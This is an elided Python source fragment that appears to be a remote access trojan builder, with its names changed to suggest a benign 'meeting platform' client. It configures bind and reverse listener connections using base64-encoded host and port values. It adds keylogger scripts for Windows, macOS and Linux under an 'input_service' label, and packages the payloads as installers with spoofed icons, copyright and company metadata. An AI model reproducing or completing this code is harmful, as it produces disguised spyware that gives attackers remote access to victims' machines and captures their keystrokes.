...
from meeting_platform_pyld_config import *

from Stitch_Vars.nsis import *
from Stitch_Vars.makeself import *
from Stitch_Vars.client_app_code import *
from Stitch_Vars.client_app_setup import *

if windows_client():
    import py2exe
    from distutils.core import setup

def assemble_meeting_platform():
    global utils_imports,utils_code

    stini = meeting_platform_ini()
    ...
    if BIND:
        ...
        main_code += add_meeting_host(BHOST,BPORT)
    if LISTEN:
        LHOST = base64.b64encode(LHOST)
        LPORT = base64.b64encode(LPORT)
        main_code += add_conference_listener(LHOST,LPORT)
    ...
    main_code += add_collaboration_features()
    ...
    st_win_kl     = get_win_input_service()
    st_osx_kl     = get_osx_input_service()
    st_lnx_kl     = get_lnx_input_service()
    ...
    win_keylg_script  = os.path.join(configuration_path,'st_win_input_service.py')
    osx_keylg_script  = os.path.join(configuration_path,'st_osx_input_service.py')
    lnx_keylg_script  = os.path.join(configuration_path,'st_lnx_input_service.py')
...
def win_gen_client_app(dist_dir,icon, dest, cpyr, cmpny, ver, name, desc):
...
def posix_gen_client_app(name,dist_dir,icon=None):
    #
...
def run_exe_gen():
    ...
    if confirm_config():
        ...
        if windows_client():
            ...
            win_progress = progress_bar(len(win_client_app_list))
            win_progress.display()
            for alias in win_client_app_list:
                retry = 0
                #st_print("[*] Creating client_app with {} configuration...".format(alias))
                while True:
                    try:
                        with nostdout():
                            win_gen_client_app(conf_dir,win_client_app_Icons[alias],alias,nsis_LegalCopyright[alias],
            ...
            nsis_creation = raw_input("\nWould you like to create NSIS Installers for your client_apps? [y/n]: ")
            if nsis_creation.lower().startswith('y'):
                if os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe"):
                    ...
                    win_progress.display()
                    for alias in win_client_app_list:
                        #st_print("[*] Creating NSIS installer for {} configured client_app...".format(alias))
            ...
            osx_progress = progress_bar(len(osx_client_app_list))
            osx_progress.display()
            for alias in osx_client_app_list:
                posix_gen_client_app(alias,conf_dir,icon=osx_client_app_Icons[alias])
                osx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            osx_progress.complete()

            mkself_creation = raw_input("\nWould you like to create Makeself Installers for your client_apps? [y/n]: ")
            ...
            lnx_progress = progress_bar(len(lnx_client_app_list))
            lnx_progress.display()
            for alias in lnx_client_app_list:
                posix_gen_client_app(alias,conf_dir)
